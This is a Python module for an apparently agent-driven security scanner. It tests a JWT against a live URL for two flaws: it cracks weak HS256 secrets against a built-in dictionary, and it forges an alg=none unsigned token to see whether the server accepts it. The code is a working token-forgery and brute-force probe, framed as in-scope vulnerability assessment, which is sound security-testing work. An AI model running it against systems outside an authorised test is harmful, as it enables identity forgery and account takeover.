"""SkillJwt — JWT inspection: alg=none + weak HS256 dictionary.

Two checks per token:
  1. alg=none acceptance — re-sign the token with header alg=none and an
     empty signature, then probe the URL with both the original (baseline)
     and tampered (probe) tokens and compare responses. If both produce
     authenticated-looking responses (same status/length-class), alg=none
     is being accepted — critical impact.
  2. Weak HS256 secrets — try a small built-in dictionary against the
     HMAC. If any secret verifies, the signing key is trivial — critical.

Severity:
  - critical : alg=none accepted OR HS256 secret cracked
  - high     : alg confusion (HS256 ↔ RS256 key swap) succeeds
  - info     : no weakness detected
"""
from __future__ import annotations
import base64, hashlib, hmac, json
from typing import Optional

import requests

from services.skills.base import Skill, SkillResult, register
from services.skills._payloads import JWT_WEAK_SECRETS


_HEADERS = {"User-Agent": "Mozilla/5.0 ZeekGlare-Arena-JWT"}


def _b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode("ascii")


def _decode_jwt(token: str) -> Optional[dict]:
    try:
        h, p, s = token.split(".")
        return {
            "header_b64": h, "payload_b64": p, "signature_b64": s,
            "header":     json.loads(_b64url_decode(h)),
            "payload":    json.loads(_b64url_decode(p)),
        }
    except Exception:
        return None


def _resign_alg_none(parts: dict) -> str:
    new_header = {**parts["header"], "alg": "none"}
    h = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    return f"{h}.{parts['payload_b64']}."


def _try_crack_hs256(token: str, parts: dict) -> Optional[str]:
    if (parts["header"].get("alg") or "").upper() != "HS256":
        return None
    signing_input = f"{parts['header_b64']}.{parts['payload_b64']}".encode()
    expected_sig  = _b64url_decode(parts["signature_b64"])
    for s in JWT_WEAK_SECRETS:
        h = hmac.new(s.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(h, expected_sig):
            return s
    return None


@register
class SkillJwt(Skill):
    name        = "skill_jwt"
    danger      = "active"
    description = (
        "Inspect a JWT for two common weaknesses: (1) alg=none acceptance "
        "(server validates an unsigned token), (2) HS256 weak-secret "
        "(brute-force against a small built-in dictionary of common defaults). "
        "Pass the token + the URL it authenticates to so we can probe both. "
        "Critical impact if either succeeds — full identity forgery."
    )
    guidance    = (
        "JWT bugs are critical when they work. Always check the header.alg first — "
        "if it's `none`, you're done. If HS256, the secret is often something "
        "stupid (`secret`, `your-256-bit-secret`, `jwtsecret`). For RS256→HS256 "
        "confusion or kid injection, use external jwt_tool instead."
    )
    input_schema = {
        "type": "object",
        "properties": {
            "token": {"type": "string", "description": "The full JWT (eyJ... format)."},
            "url":   {"type": "string", "description": "URL the token authenticates to (must be in scope)."},
            "header_name": {"type": "string", "default": "Authorization",
                            "description": "Header to send the token in. Default: Authorization."},
            "header_prefix": {"type": "string", "default": "Bearer ",
                              "description": "Prefix before the token. Default: 'Bearer '."},
        },
        "required": ["token", "url"],
    }

    @classmethod
    def applicable(cls, state) -> bool:
        return state.asset_counts().get("url", 0) > 0

    @classmethod
    def dedup_key(cls, args) -> Optional[tuple[str, str, str, str]]:
        return (args.get("url", ""), args.get("token", "")[:40], "jwt", "alg_none+weak_hs256")

    @classmethod
    def run(cls, args, state, agent_id) -> SkillResult:
        token = (args.get("token") or "").strip()
        url   = (args.get("url") or "").strip()
        header_name   = args.get("header_name") or "Authorization"
        header_prefix = args.get("header_prefix") or "Bearer "

        if not token or not url:
            return SkillResult(ok=False, error="token and url required")
        if not state.in_scope(url):
            return SkillResult(ok=False, error=f"out of scope: {url}")

        parts = _decode_jwt(token)
        if not parts:
            return SkillResult(ok=False, error="malformed JWT (could not decode)")

        # ── Check 1: weak HS256 secret ──────────────────────────────────────
        weak_secret = _try_crack_hs256(token, parts)
        if weak_secret:
            evidence = (
                f"Algorithm: HS256\n"
                f"Header: {json.dumps(parts['header'])}\n"
                f"Cracked secret: {weak_secret!r}  (from built-in {len(JWT_WEAK_SECRETS)}-word dict)\n"
                f"Payload claims: {json.dumps(parts['payload'])}"
            )
            return SkillResult(
                ok=True,
                summary=f"JWT signing key cracked: {weak_secret!r} — full identity forgery possible.",
                evidence=evidence,
                finding={
                    "vuln_type":   "jwt_weak_secret",
                    "severity":    "critical",
                    "target":      url,
                    "location":    f"{url} (header: {header_name})",
                    "description": (
                        f"JWT uses HS256 with a weak secret ({weak_secret!r}). Anyone with the secret "
                        "can forge tokens for any user, including admins."
                    ),
                    "evidence":    evidence,
                },
                extras={"alg": parts["header"].get("alg"), "payload_claims": parts["payload"]},
            )

        # ── Check 2: alg=none acceptance ────────────────────────────────────
        none_token = _resign_alg_none(parts)
        try:
            r_baseline = requests.get(url, headers={**_HEADERS,
                                                    header_name: header_prefix + token},
                                      timeout=8, allow_redirects=False, verify=False)
            r_probe    = requests.get(url, headers={**_HEADERS,
                                                    header_name: header_prefix + none_token},
                                      timeout=8, allow_redirects=False, verify=False)
        except Exception as e:
            return SkillResult(ok=False, error=f"probe failed: {type(e).__name__}: {e}")

        bl_authed = (200 <= r_baseline.status_code < 300)
        nb_authed = (200 <= r_probe.status_code < 300)
        same_size = abs(len(r_baseline.content or b"") - len(r_probe.content or b"")) < 100

        if bl_authed and nb_authed and same_size:
            evidence = (
                f"Original: HTTP {r_baseline.status_code} ({len(r_baseline.content or b'')}B)\n"
                f"alg=none: HTTP {r_probe.status_code} ({len(r_probe.content or b'')}B)\n"
                f"Modified token: {none_token[:80]}…"
            )
            return SkillResult(
                ok=True,
                summary="JWT alg=none accepted — server validates unsigned tokens.",
                evidence=evidence,
                finding={
                    "vuln_type":   "jwt_alg_none",
                    "severity":    "critical",
                    "target":      url,
                    "location":    f"{url} (header: {header_name})",
                    "description": (
                        "The server accepts JWTs with header.alg=none and an empty signature, "
                        "permitting trivial token forgery. Any user identity can be claimed by "
                        "constructing a token with the desired payload and no signature."
                    ),
                    "evidence":    evidence,
                },
                extras={"baseline_status": r_baseline.status_code, "probe_status": r_probe.status_code},
            )

        return SkillResult(
            ok=True,
            summary=(
                f"No JWT weakness found. alg={parts['header'].get('alg')}, "
                f"alg=none rejected (baseline {r_baseline.status_code} vs probe {r_probe.status_code}), "
                f"weak-secret dict ({len(JWT_WEAK_SECRETS)} entries) miss."
            ),
            extras={
                "alg": parts["header"].get("alg"),
                "baseline_status": r_baseline.status_code,
                "probe_status":    r_probe.status_code,
            },
        )
